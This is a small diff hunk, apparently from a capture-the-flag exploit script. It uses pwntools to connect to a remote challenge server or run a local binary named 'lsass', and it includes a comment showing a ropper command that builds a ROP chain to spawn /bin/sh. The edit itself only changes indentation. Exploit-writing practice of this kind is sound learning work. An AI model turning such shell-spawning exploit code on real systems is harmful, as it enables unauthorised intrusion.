@@ -84,9 +84,9 @@ from pwn import *
 binary = context.binary = ELF('./lsass')
 
 if args.REMOTE:
-        p = remote('35.238.225.156', 1004)
+    p = remote('35.238.225.156', 1004)
 else:
-        p = process(binary.path)
+    p = process(binary.path)
 
 # ropper --file lsass --chain "execve cmd=/bin/sh" --badbytes 0a
 IMAGE_BASE_0 = 0x08048000 # da2732480d49a078e666802ee2edcd948700eacaaa48129430ea1ff6d5e8e5c6
